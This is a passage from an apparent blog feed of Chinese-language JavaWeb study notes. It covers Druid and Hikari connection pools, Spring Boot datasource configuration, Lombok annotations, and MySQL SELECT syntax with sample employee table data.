<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException;</span><br></pre></td></tr></table></figure>
<ul>
<li>第三方组织必须按照DataSource接口实现</li>
</ul>
</li>
<li>
<p>常见数据库连接池</p>
<ul>
<li>C3P0</li>
<li>DBCP</li>
<li>Druid</li>
<li>Hikari（springboot默认）</li>
</ul>
</li>
<li>
<p>用的多的：Hikari、Druid  （性能更优越）</p>
</li>
<li>
<p>Hikari（追光者） [默认的连接池]</p>
</li>
<li>
<p>Druid（德鲁伊）</p>
<ul>
<li>Druid连接池是阿里巴巴开源的数据库连接池项目</li>
<li>功能强大，性能优秀，是Java语言最好的数据库连接池之一</li>
</ul>
</li>
</ul>
<h4 id="更换默认数据库连接池"><a class="header-anchor" href="#更换默认数据库连接池">¶</a>更换默认数据库连接池</h4>
<ul>
<li>参考官方地址：<a href="https://github.com/alibaba/druid/tree/master/druid-spring-boot-starter">https://github.com/alibaba/druid/tree/master/druid-spring-boot-starter</a></li>
</ul>
<ol>
<li>在<code>pom.xml</code>文件中引入依赖</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">&lt;</span>dependency<span class="operator">&gt;</span></span><br><span class="line">    <span class="operator">&lt;</span><span class="operator">!</span><span class="comment">-- Druid连接池依赖 --&gt;</span></span><br><span class="line">    <span class="operator">&lt;</span>groupId<span class="operator">&gt;</span>com.alibaba<span class="operator">&lt;</span><span class="operator">/</span>groupId<span class="operator">&gt;</span></span><br><span class="line">    <span class="operator">&lt;</span>artifactId<span class="operator">&gt;</span>druid<span class="operator">-</span>spring<span class="operator">-</span>boot<span class="operator">-</span>starter<span class="operator">&lt;</span><span class="operator">/</span>artifactId<span class="operator">&gt;</span></span><br><span class="line">    <span class="operator">&lt;</span>version<span class="operator">&gt;</span><span class="number">1.2</span><span class="number">.8</span><span class="operator">&lt;</span><span class="operator">/</span>version<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span>dependency<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>
<p>在<code>application.properties</code>中引入数据库连接配置</p>
<ol>
<li>方式一</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring.datasource.druid.driver-class-name=com.mysql.cj.jdbc.Driver</span><br><span class="line">spring.datasource.druid.url=jdbc:mysql://localhost:3306/mybatis</span><br><span class="line">spring.datasource.druid.username=root</span><br><span class="line">spring.datasource.druid.password=1234</span><br></pre></td></tr></table></figure>
<p>​				方式2</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">spring.datasource.driver<span class="operator">-</span>class<span class="operator">-</span>name<span class="operator">=</span>com.mysql.cj.jdbc.Driver</span><br><span class="line">spring.datasource.url<span class="operator">=</span>jdbc:mysql:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">3306</span><span class="operator">/</span>mybatis</span><br><span class="line">spring.datasource.username<span class="operator">=</span>root</span><br><span class="line">spring.datasource.password<span class="operator">=</span><span class="number">1234</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="lombok"><a class="header-anchor" href="#lombok">¶</a>lombok</h3>
<h4 id="介绍-v4"><a class="header-anchor" href="#介绍-v4">¶</a>介绍</h4>
<ul>
<li>
<p>Lombok是一个实用的Java类库</p>
<blockquote>
<p>可以通过简单的注解来简化和消除一些必须有但显得很臃肿的Java代码</p>
</blockquote>
</li>
<li>
<p>通过注解的形式自动生成<code>构造器</code>、<code>getter/setter</code>、<code>equals</code>、<code>hashcode</code>、<code>toString</code>等方法，并可以自动化生成日志变量，简化<code>java</code>开发、提高效率</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>注解</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>@Getter/@Setter</td>
<td>为所有的属性提供get/set方法</td>
</tr>
<tr>
<td>@ToString</td>
<td>会给类自动生成易阅读的 toString 方法</td>
</tr>
<tr>
<td>@EqualsAndHashCode</td>
<td>根据类所拥有的非静态字段自动重写 equals 方法和 hashCode 方法</td>
</tr>
<tr>
<td>@Data</td>
<td>提供了更综合的生成代码功能（@Getter + @Setter + @ToString + @EqualsAndHashCode）</td>
</tr>
<tr>
<td>@NoArgsConstructor</td>
<td>为实体类生成无参的构造器方法</td>
</tr>
<tr>
<td>@AllArgsConstructor</td>
<td>为实体类生成除了static修饰的字段之外带有各参数的构造器方法</td>
</tr>
</tbody>
</table>
<h4 id="使用"><a class="header-anchor" href="#使用">¶</a>使用</h4>
<ul>
<li>第1步：在<code>pom.xml</code>文件中引入依赖</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">&lt;</span><span class="operator">!</span><span class="comment">-- 在springboot的父工程中，已经集成了lombok并指定了版本号，故当前引入依赖时不需要指定version --&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>dependency<span class="operator">&gt;</span></span><br><span class="line">    <span class="operator">&lt;</span>groupId<span class="operator">&gt;</span>org.projectlombok<span class="operator">&lt;</span><span class="operator">/</span>groupId<span class="operator">&gt;</span></span><br><span class="line">    <span class="operator">&lt;</span>artifactId<span class="operator">&gt;</span>lombok<span class="operator">&lt;</span><span class="operator">/</span>artifactId<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span>dependency<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第2步：在<code>实体类</code>上添加注解</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="variable">@Data</span></span><br><span class="line">public class <span class="keyword">User</span> &#123;</span><br><span class="line">    private <span class="type">Integer</span> id;</span><br><span class="line">    private String name;</span><br><span class="line">    private Short age;</span><br><span class="line">    private Short gender;</span><br><span class="line">    private String phone;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在实体类上添加了@Data注解，那么这个类在编译时期，就会生成getter/setter、equals、hashcode、toString等方法</p>
</blockquote>
<ul>
<li><code>@Data</code>注解中不包含全参构造方法，通常在实体类上，还会添加上：<code>全参构造</code>、<code>无参构造</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="variable">@Data</span> <span class="operator">/</span><span class="operator">/</span>getter方法、setter方法、toString方法、hashCode方法、<span class="keyword">equals</span>方法</span><br><span class="line"><span class="variable">@NoArgsConstructor</span> <span class="operator">/</span><span class="operator">/</span>无参构造</span><br><span class="line"><span class="variable">@AllArgsConstructor</span><span class="operator">/</span><span class="operator">/</span>全参构造</span><br><span class="line">public class <span class="keyword">User</span> &#123;</span><br><span class="line">    private <span class="type">Integer</span> id;</span><br><span class="line">    private String name;</span><br><span class="line">    private Short age;</span><br><span class="line">    private Short gender;</span><br><span class="line">    private String phone;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="注意事项"><a class="header-anchor" href="#注意事项">¶</a>注意事项</h4>
<ul>
<li>Lombok会在编译时，会自动生成对应的<code>java</code>代码</li>
<li>在使用lombok时，还需要安装一个lombok的<code>插件</code>（新版本的IDEA中自带）</li>
</ul>
<h1>Day08–作业</h1>
<ul>
<li><a href="https://heuqqdmbyk.feishu.cn/docx/TjJkdW6ouofZsrxuquuc9kjZn7e">﻿⁠⁠⁠﻿⁠‌‍‬﻿‍‍‍‍‍‍‬‬‬‬‌‌‍‍﻿﻿⁠‌‬⁠‬﻿Day08-作业 - 飞书云文档 (feishu.cn)</a></li>
</ul>
<h3 id="作业1：多表查询"><a class="header-anchor" href="#作业1：多表查询">¶</a>作业1：多表查询</h3>
<ul>
<li></li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>Java notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Java</tag>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>【JavaWeb】Day07--MySQL</title>
    <url>/2024/09/09/CS_Notes/Java/%E3%80%90JavaWeb%E3%80%91Day07--MySQL/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li><a href="https://aigz8jy30yo.feishu.cn/docx/BtbOd3c5aotnpdxYTVDcnqQanxd">‍‌‍‍‬‬‌﻿﻿‌‌‬‬‌﻿⁠⁠‍‌⁠‬‍‍⁠‍‬⁠﻿‍JavaWeb 开发教程 - 飞书云文档 (feishu.cn)</a></li>
<li>需要记录的内容的标准：
<ul>
<li>已掌握的概念不记</li>
<li>太长的缩短记</li>
</ul>
</li>
<li>按照期末考前的笔记选择标准来记：
<ul>
<li>只记关键核心内容，有助于复习笔记时快速重温掌握</li>
<li>对于较长的内容，尽可能用自己的话复述</li>
</ul>
</li>
<li>努力克服完美强迫症</li>
<li><a href="https://www.runoob.com/vue3/vue3-tutorial.html">Vue3 教程 | 菜鸟教程 (runoob.com)</a></li>
<li><a href="https://element.eleme.cn/#/zh-CN">Element - 网站快速成型工具</a></li>
</ul>
<h2 id="Day07–MySQL"><a class="header-anchor" href="#Day07–MySQL">¶</a>Day07–MySQL</h2>
<h3 id="Day07–作业"><a class="header-anchor" href="#Day07–作业">¶</a>Day07–作业</h3>
<ul>
<li><a href="https://heuqqdmbyk.feishu.cn/docx/SCaAdNynuoOSj6xmDrhcUmSAnnf">‍⁠﻿﻿‍‬‍‌‌‌‌‌‬﻿‬‍‬⁠‬‬﻿﻿‍‍‍‍‍‬Day07-作业 - 飞书云文档 (feishu.cn)</a></li>
</ul>
<h3 id="数据库操作-DQL"><a class="header-anchor" href="#数据库操作-DQL">¶</a>数据库操作-DQL</h3>
<ul>
<li><code>Data Query Language(数据查询语言)</code></li>
<li>查询关键字：<code>SELECT</code></li>
</ul>
<h4 id="语法"><a class="header-anchor" href="#语法">¶</a>语法</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    字段列表</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    表名列表</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">    条件列表</span><br><span class="line"><span class="keyword">GROUP</span>  <span class="keyword">BY</span></span><br><span class="line">    分组字段列表</span><br><span class="line"><span class="keyword">HAVING</span></span><br><span class="line">    分组后条件列表</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br><span class="line">    排序字段列表</span><br><span class="line">LIMIT</span><br><span class="line">    分页参数</span><br></pre></td></tr></table></figure>
<ul>
<li>准备一些数据用作测试</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database db02; <span class="comment">-- 创建数据库</span></span><br><span class="line">use db02; <span class="comment">-- 切换数据库</span></span><br><span class="line"><span class="comment">-- 员工管理(带约束)</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_emp (</span><br><span class="line">    id <span class="type">int</span> unsigned <span class="keyword">primary</span> key auto_increment comment <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">    username <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">unique</span> comment <span class="string">&#x27;用户名&#x27;</span>,</span><br><span class="line">    password <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">default</span> <span class="string">&#x27;123456&#x27;</span> comment <span class="string">&#x27;密码&#x27;</span>,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">    gender tinyint unsigned <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;性别, 说明: 1 男, 2 女&#x27;</span>,</span><br><span class="line">    image <span class="type">varchar</span>(<span class="number">300</span>) comment <span class="string">&#x27;图像&#x27;</span>,</span><br><span class="line">    job tinyint unsigned comment <span class="string">&#x27;职位, 说明: 1 班主任,2 讲师, 3 学工主管, 4 教研主管&#x27;</span>,</span><br><span class="line">    entrydate <span class="type">date</span> comment <span class="string">&#x27;入职时间&#x27;</span>,</span><br><span class="line">    create_time datetime <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">    update_time datetime <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;修改时间&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;员工表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 准备测试数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tb_emp (id, username, password, name, gender, image, job, entrydate, create_time, update_time) <span class="keyword">VALUES</span></span><br><span class="line">    (<span class="number">1</span>, <span class="string">&#x27;jinyong&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;金庸&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;1.jpg&#x27;</span>, <span class="number">4</span>, <span class="string">&#x27;2000-01-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:35&#x27;</span>),</span><br><span class="line">    (<span class="number">2</span>, <span class="string">&#x27;zhangwuji&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;张无忌&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;2.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2015-01-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:37&#x27;</span>),</span><br><span class="line">    (<span class="number">3</span>, <span class="string">&#x27;yangxiao&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;杨逍&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;3.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2008-05-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:39&#x27;</span>),</span><br><span class="line">    (<span class="number">4</span>, <span class="string">&#x27;weiyixiao&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;韦一笑&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;4.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2007-01-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:41&#x27;</span>),</span><br><span class="line">    (<span class="number">5</span>, <span class="string">&#x27;changyuchun&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;常遇春&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;5.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2012-12-05&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:43&#x27;</span>),</span><br><span class="line">    (<span class="number">6</span>, <span class="string">&#x27;xiaozhao&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;小昭&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;6.jpg&#x27;</span>, <span class="number">3</span>, <span class="string">&#x27;2013-09-05&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:45&#x27;</span>),</span><br><span class="line">    (<span class="number">7</span>, <span class="string">&#x27;jixiaofu&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;纪晓芙&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;7.jpg&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;2005-08-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:47&#x27;</span>),</span><br><span class="line">    (<span class="number">8</span>, <span class="string">&#x27;zhouzhiruo&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;周芷若&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;8.jpg&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;2014-11-09&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:49&#x27;</span>),</span><br><span class="line">    (<span class="number">9</span>, <span class="string">&#x27;dingminjun&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;丁敏君&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;9.jpg&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;2011-03-11&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:51&#x27;</span>),</span><br><span class="line">    (<span class="number">10</span>, <span class="string">&#x27;zhaomin&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;赵敏&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;10.jpg&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;2013-09-05&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:53&#x27;</span>),</span><br><span class="line">    (<span class="number">11</span>, <span class="string">&#x27;luzhangke&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;鹿杖客&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;11.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2007-02-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:55&#x27;</span>),</span><br><span class="line">    (<span class="number">12</span>, <span class="string">&#x27;hebiweng&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;鹤笔翁&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;12.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2008-08-18&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:57&#x27;</span>),</span><br><span class="line">    (<span class="number">13</span>, <span class="string">&#x27;fangdongbai&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;方东白&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;13.jpg&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;2012-11-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:59&#x27;</span>),</span><br><span class="line">    (<span class="number">14</span>, <span class="string">&#x27;zhangsanfeng&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;张三丰&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;14.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2002-08-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:36:01&#x27;</span>),</span><br><span class="line">    (<span class="number">15</span>, <span class="string">&#x27;yulianzhou&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;俞莲舟&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;15.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2011-05-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:36:03&#x27;</span>),</span><br><span class="line">    (<span class="number">16</span>, <span class="string">&#x27;songyuanqiao&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;宋远桥&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;16.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2010-01-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:36:05&#x27;</span>),</span><br><span class="line">    (<span class="number">17</span>, <span class="string">&#x27;chenyouliang&#x27;</span>, <span class="string">&#x27;12345678&#x27;</span>, <span class="string">&#x27;陈友谅&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;17.jpg&#x27;</span>, <span class="keyword">null</span>, <span class="string">&#x27;2015-03-21&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:36:07&#x27;</span>),</span><br><span class="line">    (<span class="number">18</span>, <span class="string">&#x27;zhang1&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;张一&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;2.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2015-01-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:36:09&#x27;</span>),</span><br><span class="line">    (<span class="number">19</span>, <span class="string">&#x27;zhang2&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;张二&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;2.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2012-01-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:36:11&#x27;</span>),</span><br><span class="line">    (<span class="number">20</span>, <span class="string">&#x27;zhang3&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;张三&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;2.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2018-01-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:36:13&#x27;</span>),</span><br><span class="line">    (<span class="number">21</span>, <span class="string">&#x27;zhang4&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;张四&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;2.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2015-01-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:36:15&#x27;</span>),</span><br><span class="line">    (<span class="number">22</span>, <span class="string">&#x27;zhang5&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;张五&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;2.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2016-01-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:36:17&#x27;</span>),</span><br><span class="line">    (<span class="number">23</span>, <span class="string">&#x27;zhang6&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;张六&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;2.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2012-01-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:36:19&#x27;</span>),</span><br><span class="line">    (<span class="number">24</span>, <span class="string">&#x27;zhang7&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;张七&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;2.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2006-01-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:36:21&#x27;</span>),</span><br><span class="line">    (<span class="number">25</span>, <span class="string">&#x27;zhang8&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;张八&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;2.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2002-01-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:36:23&#x27;</span>),</span><br><span class="line">    (<span class="number">26</span>, <span class="string">&#x27;zhang9&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;张九&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;2.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2011-01-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:36:25&#x27;</span>),</span><br><span class="line">    (<span class="number">27</span>, <span class="string">&#x27;zhang10&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;张十&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;2.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2004-01-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:36:27&#x27;</span>),</span><br><span class="line">    (<span class="number">28</span>, <span class="string">&#x27;zhang11&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;张十一&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;2.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2007-01-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:36:29&#x27;</span>),</span><br><span class="line">    (<span class="number">29</span>, <span class="string">&#x27;zhang12&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;张十二&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;2.jpg&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;2020-01-01&#x27;</span>, <span class="string">&#x27;2022-10-27 16:35:33&#x27;</span>, <span class="string">&#x27;2022-10-27 16:36:31&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="基本查询"><a class="header-anchor" href="#基本查询">¶</a>基本查询</h4>
<ul>
<li>查询多个字段</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段<span class="number">1</span>, 字段<span class="number">2</span>, 字段<span class="number">3</span> <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure>
<ul>
<li>查询所有字段（通配符）</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure>
<ul>
<li>设置别名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段<span class="number">1</span> [ <span class="keyword">as</span> 别名<span class="number">1</span> ], 字段<span class="number">2</span> [ <span class="keyword">as</span> 别名<span class="number">2</span> ] <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure>
<ul>
<li>去除重复记录</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> 字段列表 <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure>
<h4 id="条件查询"><a class="header-anchor" href="#条件查询">¶</a>条件查询</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段列表 <span class="keyword">from</span> 表名 <span class="keyword">where</span> 条件列表;</span><br><span class="line"><span class="comment">-- 条件列表：可以有多个条件</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>两类构造条件的运算符：</p>
<ul>
<li><code>比较运算符</code></li>
</ul>
<table>
<thead>
<tr>
<th>比较运算符</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>&gt;</td>
<td>大于</td>
</tr>
<tr>
<td>&gt;=</td>
<td>大于等于</td>
</tr>
<tr>
<td>&lt;</td>
<td>小于</td>
</tr>
<tr>
<td>&lt;=</td>
<td>小于等于</td>
</tr>
<tr>
<td>&lt;&gt;或!=</td>
<td>不等于</td>
</tr>
<tr>
<td>between … and …</td>
<td>在某个范围内（含最小、最大值）</td>
</tr>
<tr>
<td>in (…)</td>
<td>在in之后的列表中的值，多选一</td>
</tr>
<tr>
<td>like占位符</td>
<td>模糊匹配（_匹配单个字符</td>
</tr>
<tr>
<td>=</td>
<td>等于</td>
</tr>
<tr>
<td>is null</td>
<td>是null</td>
</tr>
</tbody>
</table>
<ul>
<li><code>逻辑运算符</code></li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>逻辑运算符</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>and或&amp;&amp;</td>
<td>并且（多条件同时成立）</td>
</tr>
<tr>
<td>or或||</td>
<td>或者（多条件任一成立）</td>
</tr>
<tr>
<td>not或!</td>
<td>非，不是</td>
</tr>
</tbody>
</table>
<ul>
<li>案例8：查询 职位是 2 (讲师), 3 (学工主管), 4 (教研主管) 的员工信息</li>
</ul>
